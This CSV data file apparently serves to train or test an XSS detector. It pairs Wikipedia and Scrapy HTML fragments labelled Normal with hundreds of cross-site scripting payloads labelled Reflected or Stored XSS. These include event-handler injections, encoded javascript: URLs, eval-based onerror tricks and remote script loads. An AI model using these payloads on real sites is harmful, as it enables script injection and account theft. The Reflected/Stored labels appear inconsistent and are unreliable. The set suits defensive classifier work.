Sentence,Final_Label
"<area draggable=""true"" ondrag=""alert(1)"">test</area>",Reflected XSS
"<optgroup onmouseleave=""alert(1)"">test</optgroup>",Reflected XSS
<ul onpointerleave=alert(1)>XSS</ul>,Reflected XSS
<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>,Reflected XSS
<svg><menuitem onload=alert(1)></menuitem>,Stored XSS
<svg><marquee onload=alert(1)></marquee>,Stored XSS
<svg><base onload=alert(1)></base>,Stored XSS
"<b onmouseover=""alert(1)"">test</b>",Reflected XSS
<svg><div onload=alert(1)></div>,Stored XSS
<iframe id=x onfocus=alert(1)>,Stored XSS
"<li><i><a href=""/wiki/Index_of_philosophy_of_mind_articles"" title=""Index of philosophy of mind articles"">more... </a> </i> </li> </ul>",Normal
"<address onmouseover=""alert(1)"">test</address>",Reflected XSS
<hr onpointerenter=alert(1)>XSS</hr>,Reflected XSS
"<li><a href=""/wiki/Evolutionary_programming"" title=""Evolutionary programming"">Evolutionary programming </a> </li>",Normal
	 </span> 2007 ,Normal
"<embed onmouseenter=""alert(1)"">test</embed>",Stored XSS
<slot onpointerover=alert(1)>XSS</slot>,Reflected XSS
<script onpointerleave=alert(1)>XSS</script>,Stored XSS
<img onpointerout=alert(1)>XSS</img>,Reflected XSS
<mark onpointerup=alert(1)>XSS</mark>,Reflected XSS
"<style>@keyframes x{}</style><command style=""animation-name:x"" onanimationend=""alert(1)""></command>",Reflected XSS
"<image oncopy=""alert(1)"" contenteditable>test</image>",Reflected XSS
<p id=x tabindex=1 onbeforeactivate=alert(1)></p>,Reflected XSS
"<time ondblclick=""alert(1)"">test</time>",Reflected XSS
"<div id=""mw-head-base"" class=""noprint""> </div>",Normal
"<th draggable=""true"" ondragend=""alert(1)"">test</th>",Reflected XSS
"<li><a href=""/wiki/Consciousness"" title=""Consciousness"">Consciousness </a> </li>",Normal
"<div id=""p-variants"" role=""navigation"" class=""vectorMenu emptyPortlet"" aria-labelledby=""p-variants-label"">",Normal
"<object draggable=""true"" ondragleave=""alert(1)"">test</object>",Stored XSS
"<li><cite id=""CITEREFClark2015"" class=""citation web"">Clark, Jack (8 December 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.bloomberg.com/news/articles/2015-12-08/why-2015-was-a-breakthrough-year-in-artificial-intelligence"">""Why 2015 Was a Breakthrough Year in Artificial Intelligence"" </a>. <i>Bloomberg News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20161123053855/https://www.bloomberg.com/news/articles/2015-12-08/why-2015-was-a-breakthrough-year-in-artificial-intelligence"">Archived </a> from the original on 23 November 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 November ",Normal
<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>,Reflected XSS
"<li><a href=""/wiki/Frame_problem"" title=""Frame problem"">Frame problem </a> </li>",Normal
<dialog onpointerdown=alert(1)>XSS</dialog>,Reflected XSS
"<style>:target {color: red;}</style><script id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></script>",Stored XSS
"<script onmouseout=""alert(1)"">test</script>",Stored XSS
<figcaption onpointerover=alert(1)>XSS</figcaption>,Reflected XSS
<svg><animate onend=alert(1) attributeName=x dur=1s>,Stored XSS
"<i onmouseover=""alert(1)"">test</i>",Reflected XSS
<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>,Stored XSS
"<meta onkeypress=""alert(1)"" contenteditable>test</meta>",Reflected XSS
<s onpointermove=alert(1)>XSS</s>,Reflected XSS
<input4 onpointerup=alert(1)>XSS</input4>,Reflected XSS
<custom tags onpointerleave=alert(1)>XSS</custom tags>,Reflected XSS
<svg><meta onload=alert(1)></meta>,Stored XSS
"<listing oncontextmenu=""alert(1)"">test</listing>",Reflected XSS
"<footer onkeydown=""alert(1)"" contenteditable>test</footer>",Reflected XSS
<shadow onfocusout=alert(1) tabindex=1 id=x></shadow><input autofocus>,Reflected XSS
"<ol><li>If someone has a ""threat"" (that is, two in a row), take the remaining square. Otherwise, </li>",Normal
	 </span>(2009) </li>,Normal
<caption onpointerenter=alert(1)>XSS</caption>,Reflected XSS
"</TITLE><SCRIPT>alert("""");</SCRIPT>",Stored XSS
"<slot onkeyup=""alert(1)"" contenteditable>test</slot>",Reflected XSS
"<script onmousedown=""alert(1)"">test</script>",Stored XSS
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",Reflected XSS
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe,Stored XSS
"    <input type=""hidden"" name=""area"" value=""default"" />",Normal
"<hr onmouseover=""alert(1)"">test</hr>",Reflected XSS
"<kbd onmouseenter=""alert(1)"">test</kbd>",Reflected XSS
"			<ul><li id=""coll-create_a_book""><a href=""/w/index.php?title=Special:Book&amp;bookcmd=book_creator&amp;referer=Artificial+intelligence"">Create a book </a> </li><li id=""coll-download-as-rl""><a href=""/w/index.php?title=Special:ElectronPdf&amp;page=Artificial+intelligence&amp;action=show-download-screen"">Download as PDF </a> </li><li id=""t-print""><a href=""/w/index.php?title=Artificial_intelligence&amp;printable=yes"" title=""Printable version of this page [p]"" accesskey=""p"">Printable version </a> </li> </ul>",Normal
	 </span> 2017 ,Normal
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",Reflected XSS
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Other </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
 </ul>,Normal
"<body onmouseleave=""alert(1)"">test</body>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",Reflected XSS
"	 </span> </a> </i>&#93; </sup>. <a href=""/wiki/Google_AdSense"" title=""Google AdSense"">AdSense </a> uses a Bayesian network with over 300 million edges to learn which ads to serve.<sup id=""cite_ref-FOOTNOTEDomingos2015chapter_6_212-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDomingos2015chapter_6-212"">&#91;206&#93; </a> </sup>",Normal
"<frame ondblclick=""alert(1)"">test</frame>",Reflected XSS
"<article onmousemove=""alert(1)"">test</article>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><style id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></style>",Reflected XSS
"<li><a href=""/wiki/Resistive_random-access_memory"" title=""Resistive random-access memory"">RRAM </a> </li>",Normal
"<script>  setTimeout(\\""writetitle()\\"",$\_GET\[\]) </script>",Stored XSS
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",Stored XSS
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>",Reflected XSS
"	 </span> <span class=""reference-text""><a href=""#CITEREFHinton2007"">Hinton 2007 </a>. ",Normal
<br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>,Reflected XSS
"<nav onmouseenter=""alert(1)"">test</nav>",Reflected XSS
"<a href=""/wiki/Robotic"" class=""mw-redirect"" title=""Robotic"">Robotics </a>:",Normal
"<li><a href=""/wiki/Mind%E2%80%93body_dualism"" title=""Mind–body dualism"">Mind–body dualism </a> </li>",Normal
"<big onmouseleave=""alert(1)"">test</big>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>",Reflected XSS
"<canvas onmouseenter=""alert(1)"">test</canvas>",Reflected XSS
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",Reflected XSS
"<style>@keyframes x{}</style><html style=""animation-name:x"" onanimationend=""alert(1)""></html>",Reflected XSS
"<body onbeforecopy=""alert(1)"" contenteditable>test</body>",Reflected XSS
<select onpointerup=alert(1)>XSS</select>,Reflected XSS
"<samp draggable=""true"" ondragend=""alert(1)"">test</samp>",Reflected XSS
<title id=x tabindex=1 onactivate=alert(1)></title>,Reflected XSS
"<li id=""cite_note-47""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-47"">^ </a> </b> ",Normal
"READTHEDOCS_DATA['page'] = ""index""",Normal
<svg><ol onload=alert(1)></ol>,Stored XSS
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%""><a href=""/wiki/Cyberneticist"" title=""Cyberneticist"">Cyberneticians </a> </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" ontransitionend=alert(1)></title>",Reflected XSS
"<frame onbeforepaste=""alert(1)"" contenteditable>test</frame>",Reflected XSS
		 </div> </div>,Normal
"<blink onmouseenter=""alert(1)"">test</blink>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><dir ondragover=alert(1) contenteditable>drop here</dir>",Reflected XSS
"<figcaption onmousemove=""alert(1)"">test</figcaption>",Reflected XSS
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,Reflected XSS
"<dt><a class=""reference internal"" href=""topics/item-pipeline.html""><span class=""doc"">Item Pipeline",Normal
<sub id=x tabindex=1 onactivate=alert(1)></sub>,Reflected XSS
"<data onclick=""alert(1)"">test</data>",Reflected XSS
"<div role=""note"" class=""hatnote navigation-not-searchable"">Further information: <a href=""/wiki/Algorithmic_bias"" title=""Algorithmic bias"">Algorithmic bias </a> </div>",Normal
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/"">""The case against killer robots, from a guy actually working on artificial intelligence"" </a>. <i>Fusion.net </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160204175716/http://fusion.net/story/54583/the-case-against-killer-robots-from-a-guy-actually-building-ai/"">Archived </a> from the original on 4 February 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">31 January ",Normal
<object onpointerdown=alert(1)>XSS</object>,Stored XSS
"<colgroup onmousedown=""alert(1)"">test</colgroup>",Reflected XSS
"<pre onmouseenter=""alert(1)"">test</pre>",Reflected XSS
"<svg onmouseleave=""alert(1)"">test</svg>",Stored XSS
"	 </span> <span class=""reference-text""><cite class=""citation news"">Brown, Noam; Sandholm, Tuomas (26 January 2018). <a rel=""nofollow"" class=""external text"" href=""http://science.sciencemag.org/content/359/6374/418"">""Superhuman AI for heads-up no-limit poker: Libratus beats top professionals"" </a>. <i>Science </i>. pp.&#160;418–424. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1126%2Fscience.aao1733"">10.1126/science.aao1733 </a><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 May ",Normal
"<embed onbeforepaste=""alert(1)"" contenteditable>test</embed>",Stored XSS
"<li id=""cite_note-First_AI_winter-11""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-First_AI_winter_11-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-First_AI_winter_11-1""><sup><i><b>b </b> </i> </sup> </a> ",Normal
"<legend draggable=""true"" ondragenter=""alert(1)"">test</legend>",Reflected XSS
"<object oncut=""alert(1)"" contenteditable>test</object>",Stored XSS
"<style>@keyframes slidein {}</style><details style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></details>",Reflected XSS
<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>,Stored XSS
"<li><a href=""/wiki/Bill_Joy"" title=""Bill Joy"">Bill Joy </a> </li>",Normal
"<frameset draggable=""true"" ondragstart=""alert(1)"">test</frameset>",Reflected XSS
"<iframe onmouseover=""alert(1)"">test</iframe>",Stored XSS
"<dl draggable=""true"" ondragstart=""alert(1)"">test</dl>",Reflected XSS
"<li><a href=""/wiki/Bacterial_Colony_Optimization"" class=""mw-redirect"" title=""Bacterial Colony Optimization"">Bacterial Colony Optimization </a> </li> </ul>",Normal
"<li><a href=""/wiki/Cybernetics_in_the_Soviet_Union"" title=""Cybernetics in the Soviet Union"">Cybernetics in the Soviet Union </a> </li>",Normal
<p onpointerout=alert(1)>XSS</p>,Reflected XSS
<svg><span onload=alert(1)></span>,Stored XSS
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",Stored XSS
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationend=""alert(1)""></audio>",Reflected XSS
<svg onpointerout=alert(1)>XSS</svg>,Stored XSS
"<samp draggable=""true"" ondragenter=""alert(1)"">test</samp>",Reflected XSS
"<nextid onkeypress=""alert(1)"" contenteditable>test</nextid>",Reflected XSS
"<table onmouseenter=""alert(1)"">test</table>",Reflected XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=Artificial+intelligence+faces+reproducibility+crisis&amp;rft.pages=725-726&amp;rft.date=2018-02-16&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.359.6377.725&amp;rft_id=info%3Abibcode%2F2018Sci...359..725H&amp;rft.aulast=Hutson&amp;rft.aufirst=Matthew&amp;rft_id=http%3A%2F%2Fscience.sciencemag.org%2Fcontent%2F359%2F6377%2F725&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,Reflected XSS
<image onpointermove=alert(1)>XSS</image>,Reflected XSS
<svg><dialog onload=alert(1)></dialog>,Stored XSS
"<SCRIPT DEFER>alert("""")</SCRIPT>",Stored XSS
"<li id=""cite_note-Dreyfus&#39;_critique-355""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Dreyfus&#39;_critique_355-0"">^ </a> </b> ",Normal
"<li><a href=""/wiki/Genetic_programming"" title=""Genetic programming"">Genetic programming </a> </li>",Normal
"<style oncopy=""alert(1)"" contenteditable>test</style>",Reflected XSS
<script id=x tabindex=1 onfocus=alert(1)></script>,Stored XSS
"<dt><a class=""reference internal"" href=""topics/developer-tools.html""><span class=""doc"">Using your browser’s Developer Tools for scraping",Normal
"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",Reflected XSS
"<thead onpaste=""alert(1)"" contenteditable>test</thead>",Reflected XSS
"<frameset onmouseout=""alert(1)"">test</frameset>",Reflected XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+York+Times&amp;rft.atitle=The+Promise+of+Artificial+Intelligence+Unfolds+in+Small+Steps&amp;rft.date=2016-02-28&amp;rft.aulast=Lohr&amp;rft.aufirst=Steve&amp;rft_id=https%3A%2F%2Fwww.nytimes.com%2F2016%2F02%2F29%2Ftechnology%2Fthe-promise-of-artificial-intelligence-unfolds-in-small-steps.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
"<footer ondblclick=""alert(1)"">test</footer>",Reflected XSS
"<s onbeforepaste=""alert(1)"" contenteditable>test</s>",Reflected XSS
<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>,Reflected XSS
"<kbd onmousemove=""alert(1)"">test</kbd>",Reflected XSS
<object onpointerleave=alert(1)>XSS</object>,Stored XSS
<track onpointerover=alert(1)>XSS</track>,Reflected XSS
"a=alert,a(1)",Stored XSS
"<kbd onbeforecopy=""alert(1)"" contenteditable>test</kbd>",Reflected XSS
<dir id=x tabindex=1 onfocus=alert(1)></dir>,Reflected XSS
"<SCRIPT ""a='>'"" SRC=""httx://.rocks/.js""></SCRIPT>",Stored XSS
"<nav onmouseleave=""alert(1)"">test</nav>",Reflected XSS
<meta onpointerdown=alert(1)>XSS</meta>,Reflected XSS
"<track oncut=""alert(1)"" contenteditable>test</track>",Reflected XSS
"<li id=""cite_note-100""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-100"">^ </a> </b> ",Normal
"	 </span><span style=""display: inline-block; margin-left: 4px; width: 182px; vertical-align: middle;""><a href=""https://www.wikidata.org/wiki/Q11660"" class=""extiw"" title=""d:Q11660"">Data </a> from Wikidata ",Normal
"	 </span> <span class=""toctext"">Logic-based ",Normal
" </tr><tr><th style=""padding:0.1em"">",Normal
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 3.3, 10.3, 17.5, 20 </li> </ul>",Normal
"<li id=""cite_note-115""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-115"">^ </a> </b> ",Normal
<embed id=x onfocus=alert(1) type=text/html>,Stored XSS
"<dialog onmouseout=""alert(1)"">test</dialog>",Reflected XSS
"<li id=""cite_note-394""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-394"">^ </a> </b> ",Normal
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",Reflected XSS
"tYPE=""text/x-scriptlet"" DATA=""http://.rocks/scriptlet.html",Stored XSS
"<iframe draggable=""true"" ondragstart=""alert(1)"">test</iframe>",Stored XSS
"<sub onmouseout=""alert(1)"">test</sub>",Reflected XSS
"<dialog onmousemove=""alert(1)"">test</dialog>",Reflected XSS
<blink onpointerup=alert(1)>XSS</blink>,Reflected XSS
"<dl oncut=""alert(1)"" contenteditable>test</dl>",Reflected XSS
<svg><sup onload=alert(1)></sup>,Stored XSS
"<body class=""wy-body-for-nav"">",Normal
<strong onpointerout=alert(1)>XSS</strong>,Reflected XSS
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",Reflected XSS
"<li id=""cite_note-385""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-385"">^ </a> </b> ",Normal
"<li><a href=""/wiki/Data_mining"" title=""Data mining"">Data mining </a> </li>",Normal
<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>,Stored XSS
"<li><cite id=""CITEREFBuchanan2005"" class=""citation journal"">Buchanan, Bruce G. (2005). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070926023314/http://www.aaai.org/AITopics/assets/PDF/AIMag26-04-016.pdf"">""A (Very) Brief History of Artificial Intelligence"" </a> <span class=""cs1-format"">(PDF) ",Normal
	<ul >,Normal
"<li id=""cite_note-FOOTNOTEDomingos201588-218""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos201588_218-0"">^ </a> </b> ",Normal
"            <a href=""//readthedocs.org/projects/scrapy/?fromdocs=scrapy"">Project Home</a>",Normal
<multicol id=x tabindex=1 onbeforedeactivate=alert(1)></multicol><input autofocus>,Reflected XSS
"<li><a href=""/wiki/Multithreading_(computer_architecture)"" title=""Multithreading (computer architecture)"">Multithreading </a> </li>",Normal
"<IMG """"""><SCRIPT>alert("""")</SCRIPT>""\>",Stored XSS
"<dt><a class=""reference internal"" href=""topics/dynamic-content.html""><span class=""doc"">Selecting dynamically-loaded content",Normal
<nobr onpointerleave=alert(1)>XSS</nobr>,Reflected XSS
"<iframe onmouseout=""alert(1)"">test</iframe>",Stored XSS
"<style>@keyframes x{}</style><bgsound style=""animation-name:x"" onanimationend=""alert(1)""></bgsound>",Reflected XSS
"<li><a href=""/wiki/Claude_Bernard"" title=""Claude Bernard"">Claude Bernard </a> </li>",Normal
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, pp.&#160;2–3, who make the analogy with <a href=""/wiki/Aeronautical_engineering"" class=""mw-redirect"" title=""Aeronautical engineering"">aeronautical engineering </a>. </li>",Normal
<svg><dl onload=alert(1)></dl>,Stored XSS
<article onpointerout=alert(1)>XSS</article>,Reflected XSS
"<rtc onkeyup=""alert(1)"" contenteditable>test</rtc>",Reflected XSS
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />,Stored XSS
	 </span>(2014) </li>,Normal
"<li id=""cite_note-AI_in_England-39""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_in_England_39-0"">^ </a> </b> ",Normal
"<noframes onmousemove=""alert(1)"">test</noframes>",Reflected XSS
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Software organization </th><td class=""navbox-list navbox-even"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",Normal
"<script ondblclick=""alert(1)"">test</script>",Stored XSS
"        <script src=""_static/jquery.js""></script>",Normal
"<blockquote class=""templatequote""><p>The development of full artificial intelligence could spell the end of the human race. Once humans develop artificial intelligence, it will take off on its own and redesign itself at an ever-increasing rate. Humans, who are limited by slow biological evolution, couldn't compete and would be superseded. </p>",Normal
"<blink onmouseover=""alert(1)"">test</blink>",Reflected XSS
"<small oncopy=""alert(1)"" contenteditable>test</small>",Reflected XSS
<body onpageshow=alert(1)>,Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tfoot id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tfoot>",Reflected XSS
"<strike oncontextmenu=""alert(1)"">test</strike>",Reflected XSS
"<li><a href=""/wiki/Software_quality"" title=""Software quality"">Software quality </a> </li> </ul>",Normal
"<li class=""toctree-l1""><a class=""reference internal"" href=""news.html"">Release notes</a></li>",Normal
<svg><animate onbegin=alert(1) attributeName=x dur=1s>,Stored XSS
"<element onmouseleave=""alert(1)"">test</element>",Reflected XSS
<body ontouchmove=alert(1)> ,Reflected XSS
"<SCRIPT a="">"" SRC=""httx://.rocks/.js""></SCRIPT>",Stored XSS
<rp onpointerout=alert(1)>XSS</rp>,Reflected XSS
<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,Reflected XSS
"<summary onmouseup=""alert(1)"">test</summary>",Reflected XSS
"<li><a href=""/wiki/Artificial_general_intelligence"" title=""Artificial general intelligence"">rtificial general intelligence </a> </li> </ul> </td>",Normal
<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>,Reflected XSS
"<multicol onmouseleave=""alert(1)"">test</multicol>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><meter ondrop=alert(1) contenteditable>drop here</meter>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><iframe ondragover=alert(1) contenteditable>drop here</iframe>",Stored XSS
"<li><a href=""/wiki/Microbotics"" title=""Microbotics"">Microbotics </a> </li>",Normal
"<div draggable=""true"" contenteditable>drag me</div><mark ondragover=alert(1) contenteditable>drop here</mark>",Reflected XSS
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></li>",Reflected XSS
"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",Reflected XSS
"<source oncut=""alert(1)"" contenteditable>test</source>",Reflected XSS
"<nobr oncut=""alert(1)"" contenteditable>test</nobr>",Reflected XSS
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft_id=https%3A%2F%2Fars.electronica.art%2Foutofthebox%2Fen%2Fdigital-humanism-conf%2F+Retrieved+September+2019&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",Normal
<link onpointerdown=alert(1)>XSS</link>,Reflected XSS
"<a href=""/wiki/Hidden_Markov_model"" title=""Hidden Markov model"">Hidden Markov model </a>:",Normal
"<li><a href=""/wiki/Compiler_construction"" class=""mw-redirect"" title=""Compiler construction"">Compiler </a> </li>",Normal
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;361–381, </li>",Normal
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;275–277 </li> </ul>",Normal
	 </span>(1910) </li>,Normal
<hgroup id=x tabindex=1 onbeforedeactivate=alert(1)></hgroup><input autofocus>,Reflected XSS
<body onpointerdown=alert(1)>XSS</body>,Reflected XSS
"<dfn draggable=""true"" ondragend=""alert(1)"">test</dfn>",Reflected XSS
"<style>:target {transform: rotate(180deg);}</style><dfn id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dfn>",Reflected XSS
"<col onmousedown=""alert(1)"">test</col>",Reflected XSS
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;385–542, </li>",Normal
"<li id=""cite_note-The_Economist-135""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-The_Economist_135-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-The_Economist_135-1""><sup><i><b>b </b> </i> </sup> </a> ",Normal
"<source onkeyup=""alert(1)"" contenteditable>test</source>",Reflected XSS
"<style>@keyframes slidein {}</style><svg style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></svg>",Stored XSS
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>,Reflected XSS
"<li id=""cite_note-Configuration_space-129""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Configuration_space_129-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Configuration_space_129-1""><sup><i><b>b </b> </i> </sup> </a> ",Normal
"<del onmousemove=""alert(1)"">test</del>",Reflected XSS
"</script><img/*%00/src=""worksinchrome&colon;prompt(1)""/%00*/onerror='eval(src)'>",Stored XSS
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;266–276, 298–300, 314, 421 </li>",Normal
<style>//*{x:expression(alert(//))}//<style></style> ,Reflected XSS
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Philosophy_of_mind"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",Normal
"<strike onpaste=""alert(1)"" contenteditable>test</strike>",Reflected XSS
<hr id=x tabindex=1 ondeactivate=alert(1)></hr><input id=y autofocus>,Reflected XSS
<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>,Reflected XSS
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/>. McCarthy recently reiterated his position at the <a href=""/wiki/AI@50"" title=""AI@50"">AI@50 </a> conference where he said ""Artificial intelligence is not, by definition, simulation of human intelligence"" (<a href=""#CITEREFMaker2006"">Maker 2006 </a>). </li> </ul>",Normal
<link onpointerover=alert(1)>XSS</link>,Reflected XSS
"<div oncopy=""alert(1)"" contenteditable>test</div>",Reflected XSS
"<style>@keyframes slidein {}</style><select style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></select>",Reflected XSS
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://image-net.org/challenges/LSVRC/2017/"">""ILSVRC2017"" </a>. <i>image-net.org </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">6 November ",Normal
<q id=x tabindex=1 onactivate=alert(1)></q>,Reflected XSS
"<hgroup ondblclick=""alert(1)"">test</hgroup>",Reflected XSS
